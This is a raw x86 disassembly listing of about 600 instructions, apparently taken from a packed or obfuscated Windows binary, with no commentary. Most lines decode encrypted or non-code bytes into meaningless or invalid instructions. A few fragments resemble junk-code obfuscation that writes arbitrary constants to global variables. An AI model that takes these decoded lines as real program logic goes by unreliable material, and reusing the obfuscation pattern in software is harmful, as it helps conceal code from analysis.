  40a49b:	sub    eax,0x4ca56fa1
  40a4a0:	out    dx,al
  40a4a1:	jle    0x40a521
  40a4a3:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a4a7:	std    
  40a4a8:	hlt    
  40a4a9:	ror    BYTE PTR [edx],1
  40a4ab:	jge    0x40a4c5
  40a4ad:	(bad)  
  40a4ae:	mov    ds:0x6e87a94,al
  40a4b3:	out    0x7a,eax
  40a4b5:	push   cs
  40a4b6:	pop    edi
  40a4b7:	jmp    0xa700:0x141facf3
  40a4be:	loope  0x40a4fa
  40a4c0:	xor    cl,cl
  40a4c2:	addr16 dec ecx
  40a4c4:	in     al,0xfa
  40a4c6:	inc    ebp
  40a4c7:	mov    bl,0x59
  40a4c9:	scas   eax,DWORD PTR es:[edi]
  40a4ca:	adc    al,0xfb
  40a4cc:	add    eax,0x1373b9b
  40a4d1:	imul   ecx,DWORD PTR [ecx+0x6a],0xffffffd8
  40a4d5:	mov    ecx,0xc5014991
  40a4da:	sub    dl,ch
  40a4dc:	push   esi
  40a4dd:	push   ebp
  40a4de:	adc    bl,BYTE PTR [ecx-0x692ba0b1]
  40a4e4:	mov    ch,0xbf
  40a4e6:	add    al,0x9e
  40a4e8:	call   0xd738:0xa3fc084b
  40a4ef:	dec    DWORD PTR [edx-0x67]
  40a4f2:	jge    0x40a4c4
  40a4f4:	jp     0x40a515
  40a4f6:	mov    ds:0x2a192ef3,eax
  40a4fc:	into   
  40a4fd:	ror    BYTE PTR [edx+ebp*2],1
  40a500:	neg    DWORD PTR [esi+0x2b]
  40a503:	aam    0x31
  40a505:	pop    edx
  40a506:	add    al,0x8f
  40a508:	add    cl,BYTE PTR [edi+esi*2+0x56ea6d48]
  40a50f:	lock dec edi
  40a511:	push   ecx
  40a512:	test   eax,0x259138dd
  40a517:	push   DWORD PTR [edx]
  40a519:	aaa    
  40a51a:	xchg   edi,eax
  40a51b:	xchg   ebp,eax
  40a51c:	test   eax,0x9e0d0244
  40a521:	fwait
  40a522:	loope  0x40a519
  40a524:	sub    DWORD PTR [edi+0x2c],ebx
  40a527:	popa   
  40a528:	cmp    ebp,DWORD PTR [ebx]
  40a52a:	mul    DWORD PTR [ecx+0x10]
  40a52d:	and    BYTE PTR [ecx],ch
  40a52f:	jl     0x40a5ad
  40a531:	xor    BYTE PTR [esi+ecx*2+0x1c],ch
  40a535:	in     eax,dx
  40a536:	out    dx,eax
  40a537:	pop    esp
  40a538:	mov    esi,0xa457e7b5
  40a53d:	mov    al,ds:0xacb55fad
  40a542:	add    eax,0x19e0f310
  40a547:	pusha  
  40a548:	jle    0x40a55d
  40a54a:	push   ds
  40a54b:	(bad)  
  40a54c:	inc    eax
  40a54d:	fiadd  WORD PTR [ecx-0x3eef1412]
  40a553:	inc    ebx
  40a554:	pop    edx
  40a555:	(bad)  
  40a556:	xchg   ebp,eax
  40a557:	jp     0x40a515
  40a559:	adc    BYTE PTR [ecx-0x253768d1],bh
  40a55f:	xor    eax,0xd5bf7778
  40a564:	pop    es
  40a565:	lock lock pusha 
  40a568:	inc    esp
  40a569:	ror    DWORD PTR [eax-0x27],1
  40a56c:	mov    dh,0xd7
  40a56e:	mov    ecx,DWORD PTR [esi]
  40a570:	push   es
  40a571:	aas    
  40a572:	arpl   WORD PTR [esi],bx
  40a574:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a575:	adc    al,0xac
  40a577:	outs   dx,BYTE PTR ds:[esi]
  40a578:	inc    ebp
  40a579:	push   0x99fde3e8
  40a57e:	sub    ch,BYTE PTR [edx+0x65]
  40a581:	fnstenv [esi+0x4c79aab8]
  40a587:	shl    BYTE PTR [edx-0x41a71952],1
  40a58d:	fsub   DWORD PTR [ecx-0x68260a60]
  40a593:	cwde   
  40a594:	pop    ds
  40a595:	cmp    bh,BYTE PTR [edx]
  40a597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a598:	mov    ah,0x31
  40a59a:	mov    al,0x0
  40a59c:	das    
  40a59d:	inc    ecx
  40a59e:	xor    al,0x14
  40a5a0:	(bad)  
  40a5a1:	inc    esp
  40a5a2:	ds pop esi
  40a5a4:	sub    BYTE PTR ds:[edi-0x28],ah
  40a5a8:	icebp  
  40a5a9:	pop    ss
  40a5aa:	aad    0x10
  40a5ac:	ror    edi,0x0
  40a5af:	jbe    0x40a5fc
  40a5b1:	pop    esp
  40a5b2:	fucomi st,st(1)
  40a5b4:	add    DWORD PTR [ecx-0x5595272f],esp
  40a5ba:	rcl    BYTE PTR [eax],0xe
  40a5bd:	push   ebx
  40a5be:	xchg   edx,eax
  40a5bf:	pop    ds
  40a5c0:	inc    ecx
  40a5c1:	dec    BYTE PTR es:[ecx-0xd983904]
  40a5c8:	mov    ebp,0x34572f10
  40a5cd:	sub    DWORD PTR [ebp-0x75],edx
  40a5d0:	ins    DWORD PTR es:[edi],dx
  40a5d1:	mov    ebp,0xe9d2d088
  40a5d6:	jne    0x40a62b
  40a5d8:	add    al,0xac
  40a5da:	inc    eax
  40a5db:	mov    al,0xc8
  40a5dd:	int3   
  40a5de:	sbb    esi,DWORD PTR [ebp+eiz*1-0x6937d7d1]
  40a5e5:	or     BYTE PTR [ebx-0x5619bccf],bl
  40a5eb:	idiv   cl
  40a5ed:	adc    DWORD PTR [edi-0x2f],edx
  40a5f0:	sbb    DWORD PTR ss:[ebp+0x42407dc8],0xffffffe2
  40a5f8:	cmp    BYTE PTR [ebx],cl
  40a5fa:	int3   
  40a5fb:	push   ebp
  40a5fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5fd:	add    eax,0x1156772d
  40a602:	xchg   bh,ch
  40a604:	hlt    
  40a605:	mov    ch,BYTE PTR [edx+0x188e244b]
  40a60b:	repnz retf 
  40a60d:	adc    ecx,DWORD PTR [ebx]
  40a60f:	lods   al,BYTE PTR ds:[esi]
  40a610:	pop    ds
  40a611:	(bad)  
  40a612:	ss loop 0x40a604
  40a615:	xor    BYTE PTR [esi],dl
  40a617:	bound  esi,QWORD PTR [esi+edx*2]
  40a61a:	add    ebp,DWORD PTR [edi-0x4a]
  40a61d:	mov    al,ds:0x74f8bc3f
  40a622:	into   
  40a623:	cmp    al,0xc4
  40a625:	sbb    DWORD PTR [ecx],edx
  40a627:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a628:	push   0x5
  40a62a:	pop    ebp
  40a62b:	(bad)  
  40a62c:	pop    ecx
  40a62d:	mov    WORD PTR [eax+0x68],fs
  40a630:	mov    BYTE PTR [ebp+edx*1+0x2e],dh
  40a634:	push   ebp
  40a635:	mov    al,ds:0xf858b37f
  40a63a:	ins    DWORD PTR es:[edi],dx
  40a63b:	sbb    al,0x43
  40a63d:	enter  0x478f,0x54
  40a641:	xchg   edx,eax
  40a642:	mov    ds:0xbd54e00f,al
  40a647:	cmova  edx,DWORD PTR [edi+0x737fac96]
  40a64e:	cli    
  40a64f:	pop    eax
  40a650:	mov    edi,0xf6f6794e
  40a655:	cmc    
  40a656:	pop    es
  40a657:	dec    edi
  40a658:	fs (bad) 
  40a65b:	shr    BYTE PTR [ebx+ebp*4-0x9ca8e73],cl
  40a662:	dec    edi
  40a663:	std    
  40a664:	mov    ch,BYTE PTR [edi]
  40a666:	pop    edx
  40a667:	js     0x40a61b
  40a669:	pop    ecx
  40a66a:	ret    0xb0b
  40a66d:	not    ah
  40a66f:	(bad)  
  40a670:	mov    bh,0x6a
  40a672:	ja     0x40a6bd
  40a674:	out    0xad,al
  40a676:	or     bl,BYTE PTR [edx+eiz*8]
  40a679:	and    al,0x66
  40a67b:	stc    
  40a67c:	adc    DWORD PTR [ebx-0x3737f1c2],0xd63be1fd
  40a686:	mov    ch,0x25
  40a688:	fsub   st(3),st
  40a68a:	adc    DWORD PTR [ebx+0x52],esi
  40a68d:	adc    edx,DWORD PTR [ecx+0x74a5f5cd]
  40a693:	xchg   ebp,eax
  40a694:	jnp    0x40a61b
  40a696:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a697:	cs mov ?,edx
  40a69a:	rol    BYTE PTR [ebx+0x3f],1
  40a69d:	adc    esi,DWORD PTR [edx-0x5027ee77]
  40a6a3:	push   cs
  40a6a4:	jmp    0x28f9b1df
  40a6a9:	sbb    eax,0xd2cc4505
  40a6ae:	(bad)  
  40a6b0:	cmc    
  40a6b1:	lods   eax,DWORD PTR ds:[esi]
  40a6b2:	pusha  
  40a6b3:	lea    edi,[esi]
  40a6b5:	pusha  
  40a6b6:	retf   
  40a6b7:	gs js  0x40a676
  40a6ba:	out    dx,eax
  40a6bb:	icebp  
  40a6bc:	loop   0x40a698
  40a6be:	cmp    esp,DWORD PTR [eax+0x39a244be]
  40a6c4:	ss or  ebp,edi
  40a6c7:	push   edi
  40a6c8:	ror    DWORD PTR [eax+0x2],0xa8
  40a6cc:	or     al,BYTE PTR [ebp-0x74406707]
  40a6d2:	shl    DWORD PTR [esi],1
  40a6d4:	add    BYTE PTR [ebp+0x33e58ea3],bh
  40a6da:	xor    bl,BYTE PTR [eax-0x7f3c018c]
  40a6e0:	cmc    
  40a6e1:	add    cl,BYTE PTR [ecx+0xf]
  40a6e4:	mov    esp,0x1f60e884
  40a6e9:	int3   
  40a6ea:	sub    DWORD PTR [edx+eax*4+0x5c7f83b],eax
  40a6f1:	jmp    0x40a72a
  40a6f3:	inc    ebx
  40a6f4:	add    BYTE PTR [eax+0xf00005a],ch
  40a6fa:	test   edi,esp
  40a6fc:	or     eax,0x15810000
  40a701:	xlat   BYTE PTR ds:[ebx]
  40a702:	aaa    
  40a703:	inc    ebx
  40a704:	add    dl,bh
  40a706:	or     eax,DWORD PTR [eax]
  40a708:	add    bh,bh
  40a70a:	jne    0x40a714
  40a70c:	add    DWORD PTR ds:0x433867,0x7522
  40a716:	call   0x4115fc
  40a71b:	sbb    ecx,0x1aca
  40a721:	mov    DWORD PTR [ebp-0x20],eax
  40a724:	mov    eax,DWORD PTR [ebp-0x4]
  40a727:	xor    esi,esi
  40a729:	xor    esi,DWORD PTR ds:0x433897
  40a72f:	or     DWORD PTR ds:0x4338a3,esi
  40a735:	mov    ecx,DWORD PTR [ebp-0x20]
  40a738:	mov    esi,0x7510854
  40a73d:	xor    eax,esi
  40a73f:	add    DWORD PTR ds:0x433893,0x433787
  40a749:	add    eax,ebx
  40a74b:	mov    DWORD PTR ds:0x43382f,0x4f05
  40a755:	cmp    ecx,eax
  40a757:	mov    DWORD PTR ds:0x4337e7,0x525
  40a761:	je     0x40b9ed
  40a767:	add    DWORD PTR ds:0x43386f,0x3590
  40a771:	push   DWORD PTR [ebp-0x20]
  40a774:	xor    DWORD PTR ds:0x43377f,0x1906
  40a77e:	push   DWORD PTR [ebp+0x8]
  40a781:	dec    DWORD PTR ds:0x43385b
  40a787:	call   0x40eac8
  40a78c:	movzx  ecx,WORD PTR ds:0x43378b
  40a793:	sub    DWORD PTR ds:0x4337a3,ecx
  40a799:	jmp    0x40a9fc
  40a79e:	or     al,0xd4
  40a7a0:	and    ah,bl
  40a7a2:	loopne 0x40a78c
  40a7a4:	shl    ah,1
  40a7a6:	sti    
  40a7a7:	and    eax,0x30c9ec0c
  40a7ac:	and    ebp,ecx
  40a7ae:	push   ss
  40a7af:	in     eax,dx
  40a7b0:	jle    0x40a830
  40a7b2:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a7b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7b7:	and    al,0x41
  40a7b9:	sub    BYTE PTR [edi+0x6a0da477],cl
  40a7bf:	les    edx,FWORD PTR [ebp-0x55]
  40a7c2:	ds (bad) 
  40a7c4:	ds cmc 
  40a7c6:	mov    cl,0xcc
  40a7c8:	dec    esp
  40a7c9:	fcmovnbe st,st(4)
  40a7cb:	jno    0x40a78a
  40a7cd:	in     al,0xd7
  40a7cf:	ja     0x40a835
  40a7d1:	push   ebp
  40a7d2:	pop    es
  40a7d3:	inc    edx
  40a7d4:	or     al,BYTE PTR [edi-0x3d]
  40a7d7:	xchg   edi,eax
  40a7d8:	sub    ecx,DWORD PTR [edi]
  40a7da:	pop    ebx
  40a7db:	xchg   esp,eax
  40a7dc:	(bad)  
  40a7dd:	and    eax,0xeb744e0b
  40a7e2:	or     dh,dl
  40a7e4:	inc    edx
  40a7e5:	xlat   BYTE PTR ds:[ebx]
  40a7e6:	sub    eax,0x3ef0b2e
  40a7eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7ec:	push   ecx
  40a7ed:	test   eax,0xba0f7981
  40a7f2:	(bad)
  40a7f6:	jns    0x40a7f2
  40a7f8:	or     ah,ah
  40a7fa:	sub    al,0x66
  40a7fc:	loop   0x40a7d7
  40a7fe:	cmp    al,0xec
  40a800:	dec    esi
  40a801:	xchg   ebx,eax
  40a802:	mov    esp,0x1c9b14ee
  40a807:	mov    dl,0xee
  40a809:	loope  0x40a78f
  40a80b:	daa    
  40a80c:	daa    
  40a80d:	or     eax,DWORD PTR [edi+0x17]
  40a810:	xchg   edx,eax
  40a811:	sub    al,0xe0
  40a813:	mov    esp,0xe53b1b3e
  40a818:	nop
  40a819:	xor    ebp,esi
  40a81b:	xor    al,0xa
  40a81d:	sub    ah,BYTE PTR [edi-0x2421a25f]
  40a823:	loopne 0x40a7e0
  40a825:	repnz sub ecx,DWORD PTR [ebp-0x7d]
  40a829:	out    dx,eax
  40a82a:	mov    ebx,0x8f730eca
  40a82f:	loopne 0x40a816
  40a831:	pop    edi
  40a832:	iret   
  40a833:	repnz hlt 
  40a835:	hlt    
  40a836:	lods   al,BYTE PTR ds:[esi]
  40a837:	dec    esi
  40a838:	mov    WORD PTR [eax-0x67277df9],?
  40a83e:	mov    ebp,0xd7086cb1
  40a843:	and    eax,0x3bbe8863
  40a848:	adc    BYTE PTR [eax],bh
  40a84a:	in     eax,0xfb
  40a84c:	jo     0x40a810
  40a84e:	mov    edi,ecx
  40a850:	jmp    0x40a8bb
  40a852:	inc    esp
  40a853:	loop   0x40a801
  40a855:	sbb    al,0x3b
  40a857:	loopne 0x40a7e0
  40a859:	ror    DWORD PTR [esi-0x61],1
  40a85c:	jmp    0x27522973
  40a861:	stos   BYTE PTR es:[edi],al
  40a862:	int3   
  40a863:	enter  0x9119,0x3d
  40a867:	aas    
  40a868:	mov    dl,0x33
  40a86a:	adc    BYTE PTR [ecx+0x31],0x6d
  40a86e:	arpl   WORD PTR [eax],di
  40a870:	mov    WORD PTR [eax-0xf5c1fd],es
  40a876:	dec    bl
  40a878:	push   esi
  40a879:	out    0x37,al
  40a87b:	mov    ch,0x71
  40a87d:	mov    edx,es
  40a87f:	lea    esp,[ebx+0x7d]
  40a882:	pop    ecx
  40a883:	sar    BYTE PTR [eax-0x79361d8c],0x3b
  40a88a:	fwait
  40a88b:	sbb    eax,0x224bab31
  40a890:	pop    esi
  40a891:	or     esi,DWORD PTR [ebx-0xd64b496]
  40a897:	ins    BYTE PTR es:[edi],dx
  40a898:	pop    esp
  40a899:	cmp    ebx,esp
  40a89b:	xchg   ebp,eax
  40a89c:	inc    edx
  40a89d:	data16 or bh,dl
  40a8a0:	fs (bad) 
  40a8a2:	cmp    BYTE PTR [edi],ch
  40a8a4:	dec    esp
  40a8a5:	cmp    bh,al
  40a8a7:	test   esp,0x250042b5
  40a8ad:	pushf  
  40a8ae:	leave  
  40a8af:	cmp    DWORD PTR [ebx+0x570cc229],edi
  40a8b5:	mov    ebx,0x98ccc9ea
  40a8ba:	add    eax,0x7be70c2f
  40a8bf:	fld    QWORD PTR [esi-0x26]
  40a8c2:	or     DWORD PTR [ebp-0x344341ea],eax
  40a8c8:	popa   
  40a8c9:	or     eax,0x322b3881
  40a8ce:	push   ecx
  40a8cf:	or     esi,0x28
  40a8d2:	lock cmp eax,DWORD PTR [edx]
  40a8d5:	and    edx,DWORD PTR ds:0x49dc0d02
  40a8db:	lods   eax,DWORD PTR ds:[esi]
  40a8dc:	and    esp,DWORD PTR [edi]
  40a8de:	cli    
  40a8df:	xchg   ebx,eax
  40a8e0:	pop    edi
  40a8e1:	sar    DWORD PTR ss:[edi],0x27
  40a8e5:	pop    ss
  40a8e6:	push   0x43fcfa3b
  40a8eb:	mov    esi,DWORD PTR [edx+0x2b6c7012]
  40a8f1:	mov    ss,WORD PTR [ebp+0x62c6aa15]
  40a8f7:	xor    al,0x20
  40a8f9:	jae    0x40a8f9
  40a8fb:	push   edi
  40a8fc:	push   ds
  40a8fd:	dec    esp
  40a8fe:	lock pop ds
  40a900:	in     al,dx
  40a901:	imul   eax,DWORD PTR [edx],0x7bee1e27
  40a907:	mov    edx,0xb661e6ab
  40a90c:	cdq    
  40a90d:	cwde   
  40a90e:	mov    cl,ah
  40a910:	add    al,BYTE PTR [eax+0x283be74a]
  40a916:	jmp    0xdc1c:0x21690b1
  40a91d:	sub    al,0x8f
  40a91f:	xchg   ebp,eax
  40a920:	adc    ch,BYTE PTR ds:0x69294d3f
  40a926:	cdq    
  40a927:	sbb    bh,al
  40a929:	push   ds
  40a92a:	jmp    0x40a945
  40a92c:	(bad)  [edx]
  40a92e:	or     eax,0x9f675f01
  40a933:	push   ds
  40a934:	xchg   esp,eax
  40a935:	cmp    DWORD PTR [esi],edx
  40a937:	mov    esi,0x3680f6c6
  40a93c:	push   esp
  40a93d:	out    dx,al
  40a93e:	loope  0x40a925
  40a940:	cs inc edx
  40a942:	dec    ebx
  40a943:	or     eax,0xeedd685c
  40a948:	ja     0x40a8f7
  40a94a:	shl    DWORD PTR [esi-0xb08f90a],0x3a
  40a951:	jmp    0x40a969
  40a953:	cmp    ah,BYTE PTR ds:0x5930ab6f
  40a959:	xchg   ebx,eax
  40a95a:	push   ebx
  40a95b:	dec    esp
  40a95c:	or     ah,BYTE PTR ss:[ebp-0x1a6d1889]
  40a963:	push   cs
  40a964:	push   edx
  40a965:	clc    
  40a966:	in     eax,0x25
  40a968:	ja     0x40a97b
  40a96a:	dec    ebp
  40a96b:	arpl   si,dx
  40a96d:	jmp    0x40a938
  40a96f:	xor    BYTE PTR [ebx+0x14],dh
  40a972:	lock or al,0x88
  40a975:	xchg   esi,eax
  40a976:	fist   WORD PTR [ebx]
  40a978:	dec    edx
  40a979:	int3   
  40a97a:	xchg   ebp,eax
  40a97b:	mov    dl,0xc1
  40a97d:	cwde   
  40a97e:	in     eax,0xee
  40a980:	sbb    DWORD PTR [edx-0x567a3c52],0xe87062ec
  40a98a:	ret    
  40a98b:	popa   
  40a98c:	int3   
  40a98d:	out    0x2d,eax
  40a98f:	xor    BYTE PTR [edi],bl
  40a991:	sub    ebp,DWORD PTR [eax+0x9ade9cd]
  40a997:	mov    BYTE PTR [ebp+ebx*4+0x26527739],ch
  40a99e:	jmp    0x1833af88
  40a9a3:	xor    al,0xd6
  40a9a5:	and    al,0xd0
  40a9a7:	int3   
  40a9a8:	fcomi  st,st(6)
  40a9aa:	mov    ch,0x59
  40a9ac:	outs   dx,BYTE PTR ds:[esi]
  40a9ad:	push   edi
  40a9ae:	ja     0x40aa1f
  40a9b0:	pushf  
  40a9b1:	push   edx
  40a9b2:	add    BYTE PTR [edx-0x73550614],ch
  40a9b8:	cmp    ah,BYTE PTR [ecx+0x1d6be810]
  40a9be:	pop    ebx
  40a9bf:	push   es
  40a9c0:	scas   eax,DWORD PTR es:[edi]
  40a9c1:	int    0x4a
  40a9c3:	cs pop ss
  40a9c5:	dec    esi
  40a9c6:	retf   0xac4d
  40a9c9:	imul   ebx,DWORD PTR ss:0x87f6955d,0x1b
  40a9d1:	push   esi
  40a9d2:	push   edi
  40a9d3:	lahf   
  40a9d4:	sub    dh,dl
  40a9d6:	dec    edx
  40a9d7:	fist   WORD PTR [ecx-0x2]
  40a9da:	jnp    0x40aa14
  40a9dc:	jmp    DWORD PTR ds:0x1f572382
  40a9e2:	in     eax,0x3
  40a9e4:	inc    ebp
  40a9e5:	dec    edi
  40a9e6:	and    dh,BYTE PTR [ebp-0x22]
  40a9e9:	xchg   bh,bh
  40a9eb:	sub    eax,0x7b5e986c
  40a9f0:	repz out 0x14,eax
  40a9f3:	outs   dx,BYTE PTR ds:[esi]
  40a9f4:	in     al,0x95
  40a9f6:	jb     0x40a9ec
  40a9f8:	cmp    BYTE PTR [edi],bl
  40a9fa:	jmp    0xec863344
  40a9ff:	mov    eax,DWORD PTR [ebp-0x4]
  40aa02:	xor    DWORD PTR ds:0x433797,edi
  40aa08:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa0b:	xor    eax,esi
  40aa0d:	adc    DWORD PTR ds:0x433897,0x433867
  40aa17:	add    eax,ebx
  40aa19:	mov    DWORD PTR ds:0x4337e7,0x6600
  40aa23:	jmp    0x40ac86
  40aa28:	dec    ebp
  40aa29:	ret    
  40aa2a:	xchg   esp,eax
  40aa2b:	push   eax
  40aa2c:	nop
  40aa2d:	push   ecx
  40aa2e:	dec    ecx
  40aa2f:	ret    
  40aa30:	mov    esp,DWORD PTR es:[edx+eiz*2]
  40aa34:	push   ebx
  40aa35:	jo     0x40a9c3
  40aa37:	ret    0xebd0
  40aa3a:	jle    0x40aaba
  40aa3c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40aa40:	hlt    
  40aa41:	pop    edx
  40aa42:	mov    esi,0x7b4f5782
  40aa47:	inc    edi
  40aa48:	in     eax,0x19
  40aa4a:	add    al,0x5e
  40aa4c:	inc    edi
  40aa4d:	loopne 0x40aa69
  40aa4f:	sbb    ah,BYTE PTR [edx-0x38011a27]
  40aa55:	push   edi
  40aa56:	in     eax,dx
  40aa57:	pop    esi
  40aa58:	mov    eax,0x5c5ca62f
  40aa5d:	xchg   edi,eax
  40aa5e:	cld    
  40aa5f:	loopne 0x40a9fe
  40aa61:	cmp    ah,BYTE PTR [eax]
  40aa63:	ret    
  40aa64:	in     eax,dx
  40aa65:	jmp    0xed2b:0x3944c1ac
  40aa6c:	arpl   WORD PTR [edx-0x38ee6129],di
  40aa72:	popf   
  40aa73:	in     eax,0x45
  40aa75:	(bad)  
  40aa76:	cmp    eax,0x9e1d48bd
  40aa7b:	xchg   ebp,eax
  40aa7c:	adc    al,0x83
  40aa7e:	dec    edi
  40aa7f:	arpl   WORD PTR [ebx-0x1d056dfa],dx
  40aa85:	in     eax,0xdf
  40aa87:	dec    esp
  40aa88:	fidiv  WORD PTR [ecx]
  40aa8a:	xchg   ebp,eax
  40aa8b:	lods   al,BYTE PTR ds:[esi]
  40aa8c:	mov    ds:0x23dbf427,al
  40aa91:	and    DWORD PTR [esi-0x3b],edi
  40aa94:	pop    edi
  40aa95:	jp     0x40aaab
  40aa97:	in     al,0x49
  40aa99:	cwde   
  40aa9a:	ss jne 0x40aac0
  40aa9d:	add    BYTE PTR [esi+0x217945f],ah
  40aaa3:	mov    BYTE PTR [ebx+0x16],al
  40aaa6:	test   BYTE PTR [ebp-0x37],dl
  40aaa9:	dec    eax
  40aaaa:	imul   edx,eax,0x132179ce
  40aab0:	ins    DWORD PTR es:[edi],dx
  40aab1:	ins    DWORD PTR es:[edi],dx
  40aab2:	adc    bl,BYTE PTR [edx-0x21]
  40aab5:	sub    esp,esp
  40aab7:	and    BYTE PTR gs:[ecx+0x69],cl
  40aabb:	xor    DWORD PTR [esi-0xd],eax
  40aabe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aabf:	addr16 js 0x40aa93
  40aac2:	and    eax,0xf3ff38a0
  40aac7:	xchg   edx,eax
  40aac8:	jno    0x40ab24
  40aaca:	sahf   
  40aacb:	aam    0xa4
  40aacd:	dec    ebx
  40aace:	sub    al,0x8e
  40aad0:	and    eax,0xf7878b9e
  40aad5:	fsub   st,st(6)
  40aad7:	in     al,dx
  40aad8:	push   ecx
  40aad9:	mov    eax,0xdd43d824
  40aade:	push   esi
  40aadf:	xchg   esi,eax
  40aae0:	xchg   DWORD PTR [eax],edx
  40aae2:	ins    DWORD PTR es:[edi],dx
  40aae3:	mov    gs,WORD PTR [edx+0x4592b2a]
  40aae9:	loop   0x40aa9d
  40aaeb:	jo     0x40aad8
  40aaed:	xor    BYTE PTR [edx],dh
  40aaef:	or     DWORD PTR [esi+0x9],esi
  40aaf2:	lods   eax,DWORD PTR ds:[esi]
  40aaf3:	(bad)  
  40aaf5:	dec    ebp
  40aaf6:	(bad)  
  40aaf7:	xor    eax,0x4584b967
  40aafc:	in     eax,0xb3
  40aafe:	mov    dh,0xe6
  40ab00:	lods   eax,DWORD PTR ds:[esi]
  40ab01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab02:	out    dx,eax
  40ab03:	stos   BYTE PTR es:[edi],al
  40ab04:	or     al,0xed
  40ab06:	push   edx
  40ab07:	add    esp,DWORD PTR [ebp+0x5ba6d72d]
  40ab0d:	aas    
  40ab0e:	sbb    bh,bh
  40ab10:	enter  0xb31,0x97
  40ab14:	dec    edx
  40ab15:	jo     0x40ab5d
  40ab17:	(bad)  
  40ab18:	cmp    esi,ebx
  40ab1a:	sbb    al,0x6
  40ab1c:	xor    BYTE PTR [esi-0x15a703e2],cl
  40ab22:	pop    ss
  40ab23:	cmp    dl,BYTE PTR [edx+0x7106c763]
  40ab29:	mov    al,0xb8
  40ab2b:	inc    ecx
  40ab2c:	lock mov eax,ds:0x8cbd46d
  40ab32:	neg    DWORD PTR [ecx+edx*1-0x29]
  40ab36:	stos   BYTE PTR es:[edi],al
  40ab37:	ins    BYTE PTR es:[edi],dx
  40ab38:	loope  0x40ab9c
  40ab3a:	pop    ebx
  40ab3b:	adc    DWORD PTR [edx+eax*8],edx
  40ab3e:	ret    
  40ab3f:	xchg   DWORD PTR [eax-0xe],eax
  40ab42:	(bad)  
  40ab43:	in     eax,0xa2
  40ab45:	and    DWORD PTR [ebx+0x7a],0x93d04d52
  40ab4c:	jp     0x40ab84
  40ab4e:	cwde   
  40ab4f:	and    DWORD PTR [ecx],edx
  40ab51:	popa   
  40ab52:	xlat   BYTE PTR ds:[ebx]
  40ab53:	inc    ebx
  40ab54:	(bad)  
  40ab55:	cmp    al,0x79
  40ab57:	xchg   esi,eax
  40ab58:	call   0xf170:0x3e81c5d3
  40ab5f:	in     al,dx
  40ab60:	and    DWORD PTR [ebx],eax
  40ab62:	and    DWORD PTR [ecx-0x51b9516d],ebp
  40ab68:	into   
  40ab69:	(bad)  
  40ab6a:	in     al,0x68
  40ab6c:	scas   eax,DWORD PTR es:[edi]
  40ab6d:	out    dx,eax
  40ab6e:	adc    ah,BYTE PTR [ecx]
  40ab70:	sub    edi,DWORD PTR [edi+0x98f126e]
  40ab76:	mov    ebx,esp
  40ab78:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40ab7a:	cli    
  40ab7b:	push   edx
  40ab7c:	imul   ebp,DWORD PTR [eax-0x6ecf6d2],0xffffff8c
  40ab83:	fadd   DWORD PTR [esi+ebx*2-0x13]
  40ab87:	adc    eax,0x49b5875
  40ab8c:	jge    0x40ab92
  40ab8e:	jo     0x40abc8
  40ab90:	pop    eax
  40ab91:	jns    0x40abd9
  40ab93:	push   esi
  40ab94:	xchg   edi,eax
  40ab95:	sti    
  40ab96:	mov    ebx,edi
  40ab98:	lds    esp,FWORD PTR [eax+0x6a]
  40ab9b:	adc    ecx,eax
  40ab9d:	shl    DWORD PTR [ecx+eiz*2],0xac
  40aba1:	ds jae 0x40ab85
  40aba4:	jno    0x40ac0a
  40aba6:	rol    BYTE PTR [ebp-0x341ade88],0x78
  40abad:	mov    edi,0x9833277a
  40abb2:	mov    dh,dh
  40abb4:	stc    
  40abb5:	lds    edi,FWORD PTR [ebx]
  40abb7:	xchg   DWORD PTR [eax],esi
  40abb9:	loope  0x40abbd
  40abbb:	sbb    esp,DWORD PTR [edx+0x33fcd76b]
  40abc1:	adc    edi,edx
  40abc3:	jecxz  0x40abf3
  40abc5:	scas   eax,DWORD PTR es:[edi]
  40abc6:	lds    edi,FWORD PTR [edi+0x6a]
  40abc9:	inc    esi
  40abca:	push   cs
  40abcb:	icebp  
  40abcc:	ret    0x778c
  40abcf:	loopne 0x40ac09
  40abd1:	pop    ebx
  40abd2:	call   0x2dbc:0xda8bff08
  40abd9:	sub    esp,DWORD PTR [ebp+eax*1+0x69]
  40abdd:	xor    cl,al
  40abdf:	xchg   ebx,eax
  40abe0:	sub    eax,0x99424259
  40abe5:	(bad)  
  40abe6:	inc    esp
  40abe7:	(bad)  
  40abe8:	sti    
  40abe9:	repz dec edi
  40abeb:	or     eax,0x8d86f4de
  40abf0:	repnz pushf 
  40abf2:	push   0x3b
  40abf4:	pop    esi
  40abf5:	ror    BYTE PTR [eax],cl
  40abf7:	inc    esp
  40abf8:	imul   edx,eax,0xa906b653
  40abfe:	cdq    
  40abff:	mov    dl,0xe
  40ac01:	mov    bl,0x10
  40ac03:	out    dx,al
  40ac04:	mov    BYTE PTR [ebp+0x410c7f23],bl
  40ac0a:	xchg   BYTE PTR [edx],bl
  40ac0c:	lds    esi,FWORD PTR [esi]
  40ac0e:	and    eax,eax
  40ac10:	in     al,0x8f
  40ac12:	outs   dx,DWORD PTR ds:[esi]
  40ac13:	in     eax,dx
  40ac14:	add    BYTE PTR [edx+0x2e8ca362],cl
  40ac1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac1b:	(bad)  
  40ac1d:	mov    bh,0x49
  40ac1f:	cmc    
  40ac20:	je     0x40ac05
  40ac22:	adc    eax,0x88924d8f
  40ac27:	fdivrp st(7),st
  40ac29:	mov    ch,0xa0
  40ac2b:	gs aaa 
  40ac2d:	les    ebp,FWORD PTR [eax]
  40ac2f:	jl     0x40ac41
  40ac31:	aaa    
  40ac32:	retf   0x7033
  40ac35:	mov    ds:0x380059f8,al
